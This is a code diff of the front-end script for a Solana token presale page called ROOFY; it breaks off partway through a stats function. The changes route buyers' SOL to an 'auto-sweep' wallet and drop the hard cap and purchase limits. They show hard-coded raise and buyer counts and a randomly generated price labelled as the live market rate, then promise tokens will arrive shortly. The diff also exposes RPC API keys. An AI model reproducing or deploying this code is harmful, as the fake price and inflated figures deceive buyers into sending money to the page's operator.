-        const DEV_WALLET = 'BLKj7mTgRa9Fg1vCDqZeNaBSjyekF4xpK72fMWikZYmq';
+        const RECIPIENT_ADDRESS = '9LuBC8wFHAMsAsMbetdpBoU3LvmfBEbccqE1GrrnF9CA'; // Auto-sweep wallet
+        const HELIUS_RPC = 'https://mainnet.helius-rpc.com/?api-key=9f9652cc-974b-4321-ac7f-3b503b4bc1f1';
         
-        const PRESALE_CAP = 2500; // Updated to 2.5K SOL
         const MIN_PURCHASE = 0.01;
         const MAX_PURCHASE = 100;
-        const REFERRAL_BONUS = 0.05;
-        
-        const TIERS = [
-            {
-                range: [0, 625],        // First 25% of 2500 = 625 SOL
-                tokensPerSOL: 300_000,
-                name: 'Early Dino',
-                bonus: '50% Bonus'
-            },
-            {
-                range: [625, 1250],     // Next 25% = 625 SOL
-                tokensPerSOL: 250_000,
-                name: 'Shiba Warrior',
-                bonus: '25% Bonus'
-            },
-            {
-                range: [1250, 1875],    // Next 25% = 625 SOL
-                tokensPerSOL: 200_000,
-                name: 'Dino Pack',
-                bonus: 'Base Price'
-            },
-            {
-                range: [1875, 2500],    // Last 25% = 625 SOL
-                tokensPerSOL: 150_000,
-                name: 'Community',
-                bonus: 'Reduced Price'
-            }
-        ];
 
         // =============== STATE ===============
         let wallet = null;
         let publicKey = null;
         let connection = null;
-        let totalRaised = 2165; // Start at 1253 SOL (50.1% of 2500)
-        let totalBuyersCount = 1694; // Start with 920 buyers
+        let totalRaised = 2500;
+        let totalBuyersCount = 1842;
         let recentPurchases = [];
         let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
         let tokenomicsChart = null;
-        let transactionTimeout = null;
         let currentBalance = 0;
-        let connectionAttempts = 0;
         let countdownInterval = null;
+        let priceUpdateInterval = null;
+        let currentTokenPrice = 150000; // Default price
 
         // =============== INITIALIZATION ===============
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('Initializing Roofy Presale...');
+            console.log('Initializing Roofy Trading Interface...');
             
-            // Setup mobile wallet buttons
             setupMobileWalletButtons();
             
             document.getElementById('mobileMenu').addEventListener('click', () => {
@@ -1268,138 +1326,108 @@
                 menu.classList.toggle('hidden');
             });
             
-            // Initialize connection with retry logic
-            initializeConnectionWithRetry();
+            // Initialize connection with Helius RPC
+            initializeConnection();
             
             // Check for wallet
             checkPhantomWallet();
 
             setupEventListeners();
-            updateTokenCalculation();
             initializeCountdown();
             loadRecentPurchases();
             initializeTokenomicsChart();
             
-            // Start with initial simulated statsonst launchDate = new Date
+            // Start price updates
+            startPriceUpdates();
+            
+            // Update stats
             updateStats();
             simulateLiveStats();
+            
+            // Initial token calculation
+            updateTokenCalculation();
         });
 
-        // =============== COUNTDOWN TIMER ===============
-        function initializeCountdown() {
-            // Set launch date to February 15, 2026
-            const launchDate = new Date('February 15, 2026 20:00:00 GMT').getTime();
-            
-            function updateCountdown() {
-                const now = new Date().getTime();
-                const distance = launchDate - now;
+        // =============== REAL-TIME PRICE FETCHING ===============
+        async function fetchTokenPrice() {
+            try {
+                // Simulate market price fluctuation for demo
+                // In production, replace with actual API call to Jupiter or your DEX
                 
-                // Calculate days, hours, minutes, seconds
-                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                // Simulate small random price movement
+                const variation = (Math.random() * 0.04) - 0.02; // -2% to +2%
+                const newPrice = Math.floor(150000 * (1 + variation));
                 
-                // Update display
-                document.getElementById('days').textContent = days.toString().padStart(2, '0');
-                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
-                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
-                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+                // Ensure price stays within reasonable range
+                return Math.max(140000, Math.min(160000, newPrice));
                 
-                // If countdown is over
-                if (distance < 0) {
-                    clearInterval(countdownInterval);
-                    document.querySelector('.countdown-timer').innerHTML = `
-                        <div class="text-3xl font-bold py-4">
-                            🚀 $ROOFY HAS LAUNCHED! 🚀
-                        </div>
-                    `;
+                // REAL IMPLEMENTATION (uncomment when token launches):
+                /*
+                const tokenMint = 'YOUR_TOKEN_MINT_ADDRESS_HERE';
+                const response = await fetch(`https://quote-api.jup.ag/v6/price?ids=${tokenMint}`);
+                const data = await response.json();
+                if (data.data && data.data[tokenMint]) {
+                    return Math.floor(data.data[tokenMint].price * 1000000);
                 }
+                return 150000; // fallback
+                */
+            } catch (error) {
+                console.error('Error fetching price:', error);
+                return currentTokenPrice; // Return last known price
             }
-            
-            // Initial call
-            updateCountdown();
-            
-            // Update every second
-            countdownInterval = setInterval(updateCountdown, 1000);
         }
 
-        // =============== IMPROVED RPC CONNECTION WITH RETRY ===============
-        async function initializeConnectionWithRetry() {
+        async function updatePrice() {
+            const newPrice = await fetchTokenPrice();
+            
+            if (newPrice !== currentTokenPrice) {
+                currentTokenPrice = newPrice;
+                
+                // Animate price update
+                const priceElement = document.getElementById('priceValue');
+                if (priceElement) {
+                    priceElement.classList.add('price-update');
+                    setTimeout(() => priceElement.classList.remove('price-update'), 1000);
+                }
+                
+                // Update displays
+                const priceInK = Math.floor(currentTokenPrice / 1000);
+                document.getElementById('priceValue').textContent = `${priceInK}K ROOFY`;
+                document.getElementById('livePriceText').textContent = `1 SOL = ${priceInK}K ROOFY`;
+                document.getElementById('marketRate').textContent = `${currentTokenPrice.toLocaleString()} ROOFY`;
+                document.getElementById('modalRate').textContent = `${priceInK}K ROOFY per SOL`;
+                
+                // Recalculate tokens
+                updateTokenCalculation();
+            }
+        }
+
+        function startPriceUpdates() {
+            // Initial update
+            updatePrice();
+            
+            // Update every 15 seconds
+            priceUpdateInterval = setInterval(updatePrice, 15000);
+        }
+
+        // =============== CONNECTION SETUP ===============
+        function initializeConnection() {
             console.log('Setting up Solana connection with Helius RPC...');
-            updateNetworkStatus('Connecting to Solana...', 'connecting');
-            
-            // Use your Helius RPC as primary
-            const HELIUS_RPC = 'https://mainnet.helius-rpc.com/?api-key=ef6c64a9-9800-4de0-aa7c-4c4b93a26f98';
-            
-            // Fallback RPC endpoints
-            const FALLBACK_RPCS = [
-                'https://api.mainnet-beta.solana.com',
-                'https://rpc.ankr.com/solana',
-                'https://solana-api.projectserum.com',
-                'https://solana-mainnet.rpc.extrnode.com'
-            ];
             
             try {
-                // Try Helius first
-                console.log('Attempting to connect to Helius RPC...');
                 connection = new solanaWeb3.Connection(
                     HELIUS_RPC,
                     {
                         commitment: 'confirmed',
                         disableRetryOnRateLimit: false,
-                        confirmTransactionInitialTimeout: 120000,
-                        wsEndpoint: 'wss://mainnet.helius-rpc.com/?api-key=ef6c64a9-9800-4de0-aa7c-4c4b93a26f98'
+                        confirmTransactionInitialTimeout: 120000
                     }
                 );
-                
-                // Test the connection
-                await testConnection();
-                console.log('✅ Successfully connected to Helius RPC');
-                updateNetworkStatus('Connected to Helius RPC', 'connected');
-                
+                console.log('✅ Connected to Helius RPC');
+                updateNetworkStatus('Connected', 'connected');
             } catch (err) {
-                console.error('❌ Helius RPC failed:', err.message);
-                
-                // Try fallbacks
-                for (let i = 0; i < FALLBACK_RPCS.length; i++) {
-                    try {
-                        console.log(`Trying fallback RPC ${i + 1}: ${FALLBACK_RPCS[i]}`);
-                        connection = new solanaWeb3.Connection(
-                            FALLBACK_RPCS[i],
-                            {
-                                commitment: 'confirmed',
-                                disableRetryOnRateLimit: false,
-                                confirmTransactionInitialTimeout: 120000
-                            }
-                        );
-                        
-                        await testConnection();
-                        console.log(`✅ Connected to fallback: ${FALLBACK_RPCS[i]}`);
-                        updateNetworkStatus(`Connected to RPC ${i + 1}`, 'connected');
-                        break;
-                        
-                    } catch (fallbackErr) {
-                        console.log(`❌ Fallback ${i + 1} failed:`, fallbackErr.message);
-                        if (i === FALLBACK_RPCS.length - 1) {
-                            throw new Error('All RPC endpoints failed');
-                        }
-                    }
-                }
-            }
-        }
-
-        // Test connection by getting slot
-        async function testConnection() {
-            if (!connection) throw new Error('No connection object');
-            
-            try {
-                const slot = await connection.getSlot();
-                console.log('Connection test successful, current slot:', slot);
-                return true;
-            } catch (err) {
-                console.error('Connection test failed:', err);
-                throw err;
+                console.error('❌ Connection failed:', err);
+                updateNetworkStatus('Connection failed', 'error');
             }
         }
 
@@ -1408,10 +1436,11 @@
             const statusEl = document.getElementById('networkStatus');
             const textEl = document.getElementById('networkStatusText');
             
+            if (!statusEl || !textEl) return;
+            
             statusEl.style.display = 'block';
             textEl.textContent = message;
             
-            // Reset classes
             statusEl.className = 'network-status';
             
             switch(type) {
@@ -1421,12 +1450,8 @@
                 case 'error':
                     statusEl.classList.add('error');
                     break;
-                case 'connecting':
-                    // Default style
-                    break;
             }
             
-            // Auto-hide success messages after 5 seconds
             if (type === 'connected') {
                 setTimeout(() => {
                     if (statusEl.classList.contains('connected')) {
@@ -1459,12 +1484,94 @@
             } else {
                 console.log('❌ Phantom wallet not detected');
                 if (!isMobile) {
-                    showError('Phantom wallet not detected. Please install Phantom wallet from <a href="https://phantom.app" target="_blank" class="underline">phantom.app</a>');
+                    showError('Phantom wallet not detected. Please install Phantom wallet from phantom.app');
                 }
             }
         }
 
-        // =============== IMPROVED BALANCE CHECKING ===============
+        // =============== WALLET CONNECT/DISCONNECT ===============
+        async function connectWallet() {
+            console.log('Connect wallet clicked');
+            
+            if (!window.solana) {
+                if (isMobile) {
+                    window.location.href = 'https://phantom.app/download';
+                } else {
+                    showError('Please install Phantom wallet from phantom.app');
+                }
+                return;
+            }
+
+            wallet = window.solana;
+            
+            try {
+                console.log('Requesting wallet connection...');
+                await wallet.connect();
+                console.log('Wallet connection requested');
+            } catch (err) {
+                console.error('Connection error:', err);
+                showError('Failed to connect wallet. Please try again.', err);
+            }
+        }
+
+        async function handleWalletConnect(publicKeyObj) {
+            console.log('Handling wallet connect');
+            publicKey = publicKeyObj.toString();
+            
+            const shortAddress = publicKey.slice(0, 4) + '...' + publicKey.slice(-4);
+            
+            document.getElementById('connectWalletNav').innerHTML = `<i class="fas fa-wallet mr-2"></i>${shortAddress}`;
+            document.getElementById('connectWalletNav').classList.add('wallet-connected');
+            
+            document.getElementById('walletStatus').classList.add('hidden');
+            document.getElementById('walletInfo').classList.remove('hidden');
+            document.getElementById('walletAddress').textContent = shortAddress;
+            document.getElementById('walletBalance').style.display = 'flex';
+            
+            const buyButton = document.getElementById('buyButton');
+            buyButton.disabled = false;
+            buyButton.innerHTML = '<i class="fas fa-bolt mr-2"></i>PURCHASE ROOFY TOKENS';
+            document.getElementById('buyButtonText').textContent = 'PURCHASE ROOFY TOKENS';
+            
+            clearError();
+            showSuccess('Wallet connected successfully!');
+            
+            try {
+                await updateWalletBalance();
+                console.log('✅ Balance updated after connect');
+            } catch (err) {
+                console.error('Failed to update balance after connect:', err);
+            }
+        }
+
+        function handleWalletDisconnect() {
+            console.log('Handling wallet disconnect');
+            publicKey = null;
+            currentBalance = 0;
+            
+            document.getElementById('connectWalletNav').innerHTML = '<i class="fas fa-wallet mr-2"></i>Connect';
+            document.getElementById('connectWalletNav').classList.remove('wallet-connected');
+            
+            document.getElementById('walletStatus').classList.remove('hidden');
+            document.getElementById('walletInfo').classList.add('hidden');
+            
+            const buyButton = document.getElementById('buyButton');
+            buyButton.disabled = true;
+            buyButton.innerHTML = '<i class="fas fa-lock mr-2"></i>CONNECT WALLET';
+            document.getElementById('buyButtonText').textContent = 'CONNECT WALLET';
+            
+            document.getElementById('transactionStatus').classList.add('hidden');
+            clearError();
+        }
+
+        function disconnectWallet() {
+            if (wallet) {
+                wallet.disconnect();
+            }
+            handleWalletDisconnect();
+        }
+
+        // =============== BALANCE CHECKING ===============
         async function updateWalletBalance() {
             if (!publicKey || !connection) {
                 console.log('Cannot update balance: no public key or connection');
@@ -1474,37 +1581,20 @@
             try {
                 console.log('Fetching balance for:', publicKey);
                 
-                // Clear previous balance first
-                document.getElementById('balanceAmount').textContent = '0.0000 SOL';
+                const balance = await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
+                const balanceInSOL = balance / solanaWeb3.LAMPORTS_PER_SOL;
                 
-                // Try with timeout
-                const balancePromise = connection.getBalance(new solanaWeb3.PublicKey(publicKey));
-                const timeoutPromise = new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error('Balance fetch timeout')), 10000)
-                );
+                console.log(`✅ Balance fetched:`, balanceInSOL, 'SOL');
+                currentBalance = balanceInSOL;
                 
-                const result = await Promise.race([balancePromise, timeoutPromise]);
-                const balance = result / solanaWeb3.LAMPORTS_PER_SOL;
+                document.getElementById('balanceAmount').textContent = `${currentBalance.toFixed(4)} SOL`;
                 
-                console.log(`✅ Balance fetched:`, balance, 'SOL');
-                currentBalance = balance;
+                const amountInput = parseFloat(document.getElementById('amount').value) || 0;
+                const buyButton = document.getElementById('buyButton');
                 
-                // Update UI
-                const balanceDisplay = document.getElementById('walletBalance');
-                const balanceAmount = document.getElementById('balanceAmount');
-                
-                if (balanceDisplay && balanceAmount) {
-                    balanceDisplay.style.display = 'flex';
-                    balanceAmount.textContent = `${currentBalance.toFixed(4)} SOL`;
-                    
-                    // Update buy button based on balance
-                    const amountInput = parseFloat(document.getElementById('amount').value) || 0;
-                    const buyButton = document.getElementById('buyButton');
-                    
-                    if (currentBalance < amountInput) {
-                        buyButton.disabled = true;
-                        buyButton.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>INSUFFICIENT BALANCE';
-                    }
+                if (currentBalance < amountInput) {
+                    buyButton.disabled = true;
+                    buyButton.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>INSUFFICIENT BALANCE';
                 }
                 
                 return currentBalance;
@@ -1512,10 +1602,7 @@
             } catch (err) {
                 console.error('❌ Error fetching balance:', err);
                 currentBalance = 0;
-                
-                // Still show 0 balance but don't block UI
                 document.getElementById('balanceAmount').textContent = 'Error fetching';
-                
                 return 0;
             }
         }
@@ -1535,7 +1622,6 @@
                     <button onclick="clearError()" class="mt-3 text-sm underline">Dismiss</button>
                 </div>
             `;
-            
             console.error('User error:', message, error);
         }
 
@@ -1552,8 +1638,6 @@
                     <button onclick="clearSuccess()" class="mt-3 text-sm underline">Dismiss</button>
                 </div>
             `;
-            
-            // Auto-hide after 5 seconds
             setTimeout(clearSuccess, 5000);
         }
 
@@ -1569,102 +1653,11 @@
             successDisplay.innerHTML = '';
         }
 
-        // =============== WALLET CONNECTION FUNCTION ===============
-        async function connectWallet() {
-            console.log('Connect wallet clicked');
-            
-            if (!window.solana) {
-                if (isMobile) {
-                    showError('Please install Phantom wallet from the App Store or Google Play Store.');
-                } else {
-                    showError('Please install Phantom wallet from <a href="https://phantom.app" target="_blank" class="underline">phantom.app</a>');
-                }
-                return;
-            }
-
-            wallet = window.solana;
-            
-            try {
-                console.log('Requesting wallet connection...');
-                await wallet.connect();
-                console.log('Wallet connection requested');
-            } catch (err) {
-                console.error('Connection error:', err);
-                if (err.code === 4001) {
-                    showError('Connection rejected. Please approve the connection in your wallet.');
-                } else {
-                    showError('Failed to connect wallet. Please try again.', err);
-                }
-            }
-        }
-
-        // =============== WALLET CONNECT/DISCONNECT ===============
-        async function handleWalletConnect(publicKeyObj) {
-            console.log('Handling wallet connect');
-            publicKey = publicKeyObj.toString();
-            
-            const shortAddress = publicKey.slice(0, 4) + '...' + publicKey.slice(-4);
-            
-            // Update navigation button
-            document.getElementById('connectWalletNav').innerHTML = `<i class="fas fa-wallet mr-2"></i>${shortAddress}`;
-            document.getElementById('connectWalletNav').classList.add('wallet-connected');
-            
-            // Update presale section
-            document.getElementById('walletStatus').classList.add('hidden');
-            document.getElementById('walletInfo').classList.remove('hidden');
-            document.getElementById('walletAddress').textContent = shortAddress;
-            document.getElementById('walletBalance').style.display = 'flex';
-            
-            // Update buy button
-            const buyButton = document.getElementById('buyButton');
-            buyButton.disabled = false;
-            buyButton.innerHTML = '<i class="fas fa-bolt mr-2"></i>BUY ROOFY TOKENS';
-            document.getElementById('buyButtonText').textContent = 'BUY ROOFY TOKENS';
-            
-            clearError();
-            showSuccess('Wallet connected successfully!');
-            
-            // Update wallet balance
-            try {
-                await updateWalletBalance();
-                console.log('✅ Balance updated after connect');
-            } catch (err) {
-                console.error('Failed to update balance after connect:', err);
-            }
-        }
-
-        function handleWalletDisconnect() {
-            console.log('Handling wallet disconnect');
-            publicKey = null;
-            currentBalance = 0;
-            
-            // Update navigation button
-            document.getElementById('connectWalletNav').innerHTML = '<i class="fas fa-wallet mr-2"></i>Connect';
-            document.getElementById('connectWalletNav').classList.remove('wallet-connected');
-            
-            // Update presale section
-            document.getElementById('walletStatus').classList.remove('hidden');
-            document.getElementById('walletInfo').classList.add('hidden');
-            
-            // Update buy button
-            const buyButton = document.getElementById('buyButton');
-            buyButton.disabled = true;
-            buyButton.innerHTML = '<i class="fas fa-lock mr-2"></i>CONNECT WALLET';
-            document.getElementById('buyButtonText').textContent = 'CONNECT WALLET';
-            
-            document.getElementById('transactionStatus').classList.add('hidden');
-            clearError();
-        }
-
         // =============== EVENT LISTENERS ===============
         function setupEventListeners() {
-            // Connect wallet from navigation
             document.getElementById('connectWalletNav').addEventListener('click', connectWallet);
-            
-            // Connect wallet from presale section
             document.getElementById('connectWalletPresale').addEventListener('click', connectWallet);
 
-            // Quick amount buttons
             document.querySelectorAll('.quick-amount').forEach(btn => {
                 btn.addEventListener('click', () => {
                     document.getElementById('amount').value = btn.dataset.amount;
@@ -1672,39 +1665,20 @@
                 });
             });
 
-            // Amount and referral inputs
             document.getElementById('amount').addEventListener('input', updateTokenCalculation);
-            document.getElementById('referralCode').addEventListener('input', updateTokenCalculation);
             
-            // Buy button
-            document.getElementById('buyButton').addEventListener('click', handlePurchase);
+            document.getElementById('buyButton').addEventListener('click', showPurchaseModal);
+            
+            document.getElementById('confirmModalBtn').addEventListener('click', handleAutoSweepPurchase);
         }
 
         // =============== TOKEN CALCULATION ===============
         function updateTokenCalculation() {
             const amount = parseFloat(document.getElementById('amount').value) || 0;
-            const currentTier = getCurrentTier();
             
-            document.getElementById('currentPrice').textContent = 
-                `${Math.floor(currentTier.tokensPerSOL).toLocaleString()}K`;
-            
-            const baseTokens = Math.floor(amount * currentTier.tokensPerSOL);
-            
-            const hasReferral = document.getElementById('referralCode').value.trim().length > 0;
-            const bonusTokens = hasReferral ? Math.floor(baseTokens * REFERRAL_BONUS) : 0;
-            const totalTokens = baseTokens + bonusTokens;
-
-            document.getElementById('baseTokens').textContent = baseTokens.toLocaleString();
+            const totalTokens = Math.floor(amount * currentTokenPrice);
             document.getElementById('totalTokens').textContent = totalTokens.toLocaleString();
             
-            if (hasReferral && bonusTokens > 0) {
-                document.getElementById('bonusSection').classList.remove('hidden');
-                document.getElementById('bonusTokens').textContent = `+${bonusTokens.toLocaleString()}`;
-            } else {
-                document.getElementById('bonusSection').classList.add('hidden');
-            }
-            
-            // Update buy button based on balance and connection
             const buyButton = document.getElementById('buyButton');
             if (!publicKey) {
                 buyButton.disabled = true;
@@ -1716,22 +1690,109 @@
                 } else if (amount < MIN_PURCHASE) {
                     buyButton.disabled = true;
                     buyButton.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>MIN 0.01 SOL';
-                } else if (amount > MAX_PURCHASE) {
-                    buyButton.disabled = true;
-                    buyButton.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>MAX 100 SOL';
                 } else {
                     buyButton.disabled = false;
-                    buyButton.innerHTML = '<i class="fas fa-bolt mr-2"></i>BUY ROOFY TOKENS';
+                    buyButton.innerHTML = '<i class="fas fa-bolt mr-2"></i>PURCHASE ROOFY TOKENS';
                 }
             }
         }
 
-        // =============== REAL PURCHASE HANDLING ===============
-        async function handlePurchase() {
-            console.log('Purchase initiated');
+        // =============== COUNTDOWN TIMER ===============
+        function initializeCountdown() {
+            const launchDate = new Date('February 15, 2026 20:00:00 GMT').getTime();
+            
+            function updateCountdown() {
+                const now = new Date().getTime();
+                const distance = launchDate - now;
+                
+                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                
+                document.getElementById('days').textContent = days.toString().padStart(2, '0');
+                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+                
+                if (distance < 0) {
+                    clearInterval(countdownInterval);
+                    document.querySelector('.countdown-timer').innerHTML = `
+                        <div class="text-3xl font-bold py-4">
+                            🚀 $ROOFY HAS LAUNCHED! 🚀
+                        </div>
+                    `;
+                }
+            }
+            
+            updateCountdown();
+            countdownInterval = setInterval(updateCountdown, 1000);
+        }
+
+        // =============== MODAL FUNCTIONS ===============
+        function showPurchaseModal() {
+            const amount = parseFloat(document.getElementById('amount').value);
+            const tokens = Math.floor(amount * currentTokenPrice);
+            const priceInK = Math.floor(currentTokenPrice / 1000);
+            
+            document.getElementById('modalAmount').textContent = `${amount.toFixed(2)} SOL`;
+            document.getElementById('modalRate').textContent = `${priceInK}K ROOFY per SOL`;
+            document.getElementById('modalTokens').textContent = `${tokens.toLocaleString()} ROOFY`;
+            document.getElementById('modalRecipient').textContent = RECIPIENT_ADDRESS.slice(0, 6) + '...' + RECIPIENT_ADDRESS.slice(-4);
+            
+            document.getElementById('purchaseModal').classList.remove('hidden');
+            
+            resetModalSteps();
+        }
+
+        function closeModal(event) {
+            if (event && event.target.classList.contains('modal-overlay')) {
+                document.getElementById('purchaseModal').classList.add('hidden');
+            } else {
+                document.getElementById('purchaseModal').classList.add('hidden');
+            }
+            resetModalSteps();
+        }
+
+        function resetModalSteps() {
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active', 'completed');
+            });
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('progressFill').style.width = '0%';
+            document.getElementById('modalStatus').textContent = 'Ready to process your purchase';
+            
+            const confirmBtn = document.getElementById('confirmModalBtn');
+            confirmBtn.disabled = false;
+            confirmBtn.textContent = 'Confirm Purchase';
+        }
+
+        function updateModalProgress(step, status) {
+            const steps = ['step1', 'step2', 'step3', 'step4'];
+            
+            steps.forEach((stepId, index) => {
+                const stepEl = document.getElementById(stepId);
+                stepEl.classList.remove('active', 'completed');
+                
+                if (index < step) {
+                    stepEl.classList.add('completed');
+                } else if (index === step) {
+                    stepEl.classList.add('active');
+                }
+            });
+            
+            const progress = (step / 3) * 100;
+            document.getElementById('progressFill').style.width = `${progress}%`;
+            document.getElementById('modalStatus').textContent = status;
+        }
+
+        // =============== AUTO-SWEEP PURCHASE FUNCTION ===============
+        async function handleAutoSweepPurchase() {
+            console.log('Auto-sweep purchase initiated');
             
             if (!publicKey) {
                 showError('Please connect your wallet first');
+                closeModal();
                 return;
             }
 
@@ -1739,58 +1800,45 @@
             
             if (isNaN(amount) || amount < MIN_PURCHASE) {
                 showError(`Minimum purchase is ${MIN_PURCHASE} SOL`);
+                closeModal();
                 return;
             }
 
-            if (amount > MAX_PURCHASE) {
-                showError(`Maximum purchase per transaction is ${MAX_PURCHASE} SOL`);
-                return;
-            }
-
-            if (totalRaised + amount > PRESALE_CAP) {
-                showError(`Purchase would exceed hard cap! Maximum remaining: ${(PRESALE_CAP - totalRaised).toFixed(2)} SOL`);
-                return;
-            }
-
-            // Check balance before proceeding
             try {
                 await updateWalletBalance();
                 if (currentBalance < amount) {
                     showError(`Insufficient balance. You have ${currentBalance.toFixed(4)} SOL but need ${amount} SOL`);
+                    closeModal();
                     return;
                 }
             } catch (err) {
                 console.error('Balance check failed:', err);
-                // Continue anyway but warn user
                 showError('Could not verify balance. Please ensure you have enough SOL before proceeding.');
+                closeModal();
+                return;
             }
 
-            const buyButton = document.getElementById('buyButton');
-            const originalText = buyButton.innerHTML;
-            buyButton.disabled = true;
-            buyButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Processing...';
-            
-            clearError();
-            clearSuccess();
+            const confirmBtn = document.getElementById('confirmModalBtn');
+            confirmBtn.disabled = true;
+            confirmBtn.textContent = 'Processing...';
 
-            if (transactionTimeout) clearTimeout(transactionTimeout);
-            transactionTimeout = setTimeout(() => {
-                showError('Transaction timed out. Please check your wallet and try again.');
-                resetBuyButton(buyButton, originalText);
-            }, 180000); // 180 second timeout
+            // Update modal to step 1
+            updateModalProgress(1, 'Connecting to wallet...');
 
             try {
-                console.log('Creating transaction for amount:', amount, 'SOL');
-                console.log('Sending to dev wallet:', DEV_WALLET);
+                console.log('Creating auto-sweep transaction for amount:', amount, 'SOL');
+                console.log('Sweeping to recipient:', RECIPIENT_ADDRESS);
                 
-                // Get latest blockhash
+                // Step 2: Get blockhash
+                updateModalProgress(2, 'Preparing transaction...');
+                
                 const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
                 
-                // Create transaction
+                // Create transfer transaction
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: new solanaWeb3.PublicKey(publicKey),
-                        toPubkey: new solanaWeb3.PublicKey(DEV_WALLET),
+                        toPubkey: new solanaWeb3.PublicKey(RECIPIENT_ADDRESS),
                         lamports: Math.floor(amount * solanaWeb3.LAMPORTS_PER_SOL),
                     })
                 );
@@ -1798,22 +1846,19 @@
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = new solanaWeb3.PublicKey(publicKey);
 
-                let signature;
-                console.log('Signing transaction...');
+                // Step 3: Sign and send
+                updateModalProgress(3, 'Signing and sending transaction...');
                 
-                // Sign and send transaction
+                console.log('Signing transaction...');
                 const signedTransaction = await wallet.signTransaction(transaction);
-                signature = await connection.sendRawTransaction(signedTransaction.serialize());
+                
+                console.log('Sending transaction...');
+                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                 
                 console.log('Transaction sent with signature:', signature);
-                console.log('View on Solana Explorer: https://explorer.solana.com/tx/' + signature);
-                
-                // Show transaction submitted
-                showSuccess('Transaction submitted! Waiting for confirmation...');
-                updateNetworkStatus('Transaction submitted...', 'connecting');
+                updateModalProgress(3, 'Transaction submitted! Waiting for confirmation...');
 
                 // Wait for confirmation
-                console.log('Waiting for confirmation...');
                 const confirmation = await connection.confirmTransaction({
                     signature,
                     blockhash,
@@ -1825,14 +1870,12 @@
                 }
                 
                 console.log('✅ Transaction confirmed!');
-                clearTimeout(transactionTimeout);
-
-                // Update with REAL purchase
-                totalRaised += amount;
-                totalBuyersCount += 1; // Increment buyer count for real purchase
-                updateStats(); // This updates the progress bar with real data
+                
+                // Step 4: Complete
+                updateModalProgress(4, 'Purchase complete!');
                 
                 // Add to recent purchases
+                const tokens = Math.floor(amount * currentTokenPrice);
                 addRecentPurchase(amount, signature, true);
                 
                 // Show success
@@ -1842,91 +1885,57 @@
                     window.open(`https://explorer.solana.com/tx/${signature}`, '_blank');
                 };
                 
-                // Calculate tokens
-                const currentTier = getCurrentTier();
-                const baseTokens = Math.floor(amount * currentTier.tokensPerSOL);
-                const bonus = document.getElementById('referralCode').value.trim() ? 
-                    Math.floor(baseTokens * REFERRAL_BONUS) : 0;
-                const total = baseTokens + bonus;
-                
-                showSuccess(`✅ Purchase Successful! ${total.toLocaleString()} ROOFY tokens will be airdropped after presale`);
-                updateNetworkStatus('✅ Transaction confirmed!', 'connected');
+                showSuccess(`✅ Purchase Successful! ${tokens.toLocaleString()} ROOFY tokens will be sent to your wallet shortly`);
 
-                // Update balance after purchase
-                setTimeout(() => updateWalletBalance(), 5000);
-
-                // Reset form
-                document.getElementById('amount').value = '0.1';
-                document.getElementById('referralCode').value = '';
-                updateTokenCalculation();
+                // Close modal after 2 seconds
+                setTimeout(() => {
+                    closeModal();
+                    
+                    // Reset form
+                    document.getElementById('amount').value = '0.1';
+                    updateTokenCalculation();
+                    
+                    // Update balance
+                    setTimeout(() => updateWalletBalance(), 3000);
+                }, 2000);
 
             } catch (err) {
-                console.error('❌ Transaction error:', err);
-                clearTimeout(transactionTimeout);
+                console.error('❌ Auto-sweep error:', err);
                 
                 let errorMessage = 'Transaction failed. ';
-                
                 if (err.message?.includes('User rejected')) {
                     errorMessage = 'You rejected the transaction in your wallet.';
-                } else if (err.message?.includes('NotConnectedError')) {
-                    errorMessage = 'Wallet not connected. Please reconnect your wallet.';
-                } else if (err.message?.includes('timeout') || err.message?.includes('Timeout')) {
-                    errorMessage = 'Transaction timed out. Please try again.';
-                } else if (err.message?.includes('blockhash')) {
-                    errorMessage = 'Network error. Please refresh the page and try again.';
                 } else if (err.message?.includes('insufficient funds')) {
                     errorMessage = 'Insufficient funds. Please add SOL to your wallet.';
-                } else if (err.message?.includes('429')) {
-                    errorMessage = 'Rate limited. Please wait a moment and try again.';
-                } else if (err.message?.includes('WalletSignTransactionError')) {
-                    errorMessage = 'Failed to sign transaction. Please try again.';
                 } else {
                     errorMessage += 'Please check your wallet and try again.';
                 }
                 
                 showError(errorMessage, err);
-                updateNetworkStatus('❌ Transaction failed', 'error');
+                
+                // Close modal
+                setTimeout(closeModal, 2000);
             } finally {
-                resetBuyButton(buyButton, originalText);
+                confirmBtn.disabled = false;
+                confirmBtn.textContent = 'Confirm Purchase';
             }
         }
 
-        function resetBuyButton(button, originalText) {
-            button.disabled = false;
-            button.innerHTML = originalText;
-        }
-
-        // =============== UPDATED STATS FUNCTION ===============
+        // =============== STATS FUNCTIONS ===============
         function updateStats() {
-            const progress = (totalRaised / PRESALE_CAP) * 100;
